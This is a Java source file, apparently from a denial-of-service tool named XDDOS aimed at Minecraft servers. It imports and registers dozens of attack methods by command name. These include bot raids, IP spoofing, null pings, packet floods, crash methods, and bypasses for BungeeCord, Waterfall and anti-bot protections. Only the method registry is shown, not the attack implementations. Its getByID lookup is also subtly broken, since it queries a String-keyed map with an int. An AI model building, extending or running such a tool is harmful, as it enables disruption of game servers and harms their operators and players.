package XD.XDDOS.methods;

import XD.XDDOS.methods.impl.Beta;
import XD.XDDOS.methods.impl.BigHandshake;
import XD.XDDOS.methods.impl.BigPacket;
import XD.XDDOS.methods.impl.BotJoiner;
import XD.XDDOS.methods.impl.BotRaid;
import XD.XDDOS.methods.impl.BungeeDowner;
import XD.XDDOS.methods.impl.CPUDowner;
import XD.XDDOS.methods.impl.ChatSpam;
import XD.XDDOS.methods.impl.ColorCrasher;
import XD.XDDOS.methods.impl.DoubleJoin;
import XD.XDDOS.methods.impl.EmptyNames;
import XD.XDDOS.methods.impl.EmptyPacket;
import XD.XDDOS.methods.impl.ExtremeJoin;
import XD.XDDOS.methods.impl.ExtremeKiller;
import XD.XDDOS.methods.impl.HandshakeMethod;
import XD.XDDOS.methods.impl.IPSpoof;
import XD.XDDOS.methods.impl.IPSpoofFFlood;
import XD.XDDOS.methods.impl.InstantDowner;
import XD.XDDOS.methods.impl.InvalidData;
import XD.XDDOS.methods.impl.InvalidIPSpoof;
import XD.XDDOS.methods.impl.InvalidNames;
import XD.XDDOS.methods.impl.Join;
import XD.XDDOS.methods.impl.LegacyPing;
import XD.XDDOS.methods.impl.LegitNameKiller;
import XD.XDDOS.methods.impl.Localhost;
import XD.XDDOS.methods.impl.LoginPingMulticrasher;
import XD.XDDOS.methods.impl.LongHost;
import XD.XDDOS.methods.impl.LongNames;
import XD.XDDOS.methods.impl.Memory;
import XD.XDDOS.methods.impl.Motd;
import XD.XDDOS.methods.impl.NettyDowner;
import XD.XDDOS.methods.impl.Network;
import XD.XDDOS.methods.impl.NewNullPing;
import XD.XDDOS.methods.impl.NullPing;
import XD.XDDOS.methods.impl.Ping;
import XD.XDDOS.methods.impl.PlayPacket;
import XD.XDDOS.methods.impl.QueryFlood;
import XD.XDDOS.methods.impl.QuitExceptions;
import XD.XDDOS.methods.impl.RAM;
import XD.XDDOS.methods.impl.RandomBytes;
import XD.XDDOS.methods.impl.RandomExceptions;
import XD.XDDOS.methods.impl.ServerFucker;
import XD.XDDOS.methods.impl.Slapper;
import XD.XDDOS.methods.impl.SmartBot;
import XD.XDDOS.methods.impl.TCPBYPASS;
import XD.XDDOS.methods.impl.TCPFlow;
import XD.XDDOS.methods.impl.TCPHIT;
import XD.XDDOS.methods.impl.UUIDCrash;
import XD.XDDOS.methods.impl.UltimateKiller;
import XD.XDDOS.methods.impl.UltimateSmasher;
import XD.XDDOS.methods.impl.WaterfallBypass;
import XD.XDDOS.methods.impl.XDJOIN;
import XD.XDDOS.methods.impl.XDSPAM;
import XD.XDDOS.methods.impl.YooniksCry;
import XD.XDDOS.methods.impl.nAntiBotCry;
import XD.XDDOS.methods.impl.queue;

import java.util.HashMap;

public class Methods {
   public static final HashMap<String, IMethod> METHODS = new HashMap<String,IMethod>();

   public static IMethod getByID(int i) {
      return (IMethod)METHODS.getOrDefault(i, (c, p) -> {
         c.close();
         System.err.println("invalid method id: " + i);
      });
   }

   private static void registerMethod(String name, IMethod m) {
      if (METHODS.containsKey(name)) {
         throw new IllegalStateException("Method with id " + name + " already exists");
      } else {
         METHODS.put(name, m);
      }
   }

   public static void setupMethods() {
      registerMethod("bigpacket", (IMethod)new BigPacket());
      registerMethod("botjoiner", (IMethod)new BotJoiner());
      registerMethod("botraid", (IMethod)new BotRaid());
      registerMethod("doublejoin", (IMethod)new DoubleJoin());
      registerMethod("emptypacket", (IMethod)new EmptyPacket());
      registerMethod("xdspam", (IMethod)new XDSPAM());
      registerMethod("handshake", (IMethod)new HandshakeMethod());
      registerMethod("invaliddata", (IMethod)new InvalidData());
      registerMethod("invalidspoof", (IMethod)new InvalidIPSpoof());
      registerMethod("invalidnames", (IMethod)new InvalidNames());
      registerMethod("spoof", (IMethod)new IPSpoof());
      registerMethod("join", (IMethod)new Join());
      registerMethod("legacyping", (IMethod)new LegacyPing());
      registerMethod("legitnamejoin", (IMethod)new LegitNameKiller());
      registerMethod("localhost", (IMethod)new Localhost());
      registerMethod("pingjoin", (IMethod)new LoginPingMulticrasher());
      registerMethod("longhost", (IMethod)new LongHost());
      registerMethod("longnames", (IMethod)new LongNames());
      registerMethod("nullping", (IMethod)new NullPing());
      registerMethod("ping", (IMethod)new Ping());
      registerMethod("query", (IMethod)new QueryFlood());
      registerMethod("randompacket", (IMethod)new RandomBytes());
      registerMethod("bighandshake", (IMethod)new BigHandshake());
      registerMethod("unexpectedpacket", (IMethod)new PlayPacket());
      registerMethod("memory", (IMethod)new Memory());
      registerMethod("network", (IMethod)new Network());
      registerMethod("extremejoin", (IMethod)new ExtremeJoin());
      registerMethod("nettydowner", (IMethod)new NettyDowner());
      registerMethod("ram", (IMethod)new RAM());
      registerMethod("aegis", (IMethod)new YooniksCry());
      registerMethod("colorcrasher", (IMethod)new ColorCrasher());
      registerMethod("tcphit", (IMethod)new TCPHIT());
      registerMethod("queue", (IMethod)new queue());
      registerMethod("tcpbypass", (IMethod)new TCPBYPASS());
      registerMethod("ultimatesmasher", (IMethod)new UltimateSmasher());
      registerMethod("serverfucker", (IMethod)new ServerFucker());
      registerMethod("nantibot", (IMethod)new nAntiBotCry());
      registerMethod("xdjoin", (IMethod)new XDJOIN());
      registerMethod("ipSpooffflood", (IMethod)new IPSpoofFFlood());
      registerMethod("chatspam" , (IMethod)new ChatSpam());
      registerMethod("cpudowner", (IMethod)new CPUDowner());
      registerMethod("extremekiller", (IMethod)new ExtremeKiller());
      registerMethod("instantdowner", (IMethod)new InstantDowner());
      registerMethod("motd", (IMethod)new Motd());
      registerMethod("newnullping", (IMethod)new NewNullPing());
      registerMethod("quitexceptions", (IMethod)new QuitExceptions());
      registerMethod("randomexceptions", (IMethod)new RandomExceptions());
      registerMethod("slapper", (IMethod)new Slapper());
      registerMethod("smartbot", (IMethod)new SmartBot());
      registerMethod("ultimatekiller", (IMethod)new UltimateKiller());
      registerMethod("waterfallbypass", (IMethod)new WaterfallBypass());
      registerMethod("emptynames", (IMethod)new EmptyNames());
      registerMethod("uuidcrash", (IMethod)new UUIDCrash());
      registerMethod("bungeedowner", (IMethod)new BungeeDowner());
      registerMethod("beta", (IMethod)new Beta());
      registerMethod("tcpflow", (IMethod)new TCPFlow());
   }

   public static IMethod getMethod(String methodID) {
      return (IMethod)METHODS.getOrDefault(methodID, new NettyDowner());
   }

}
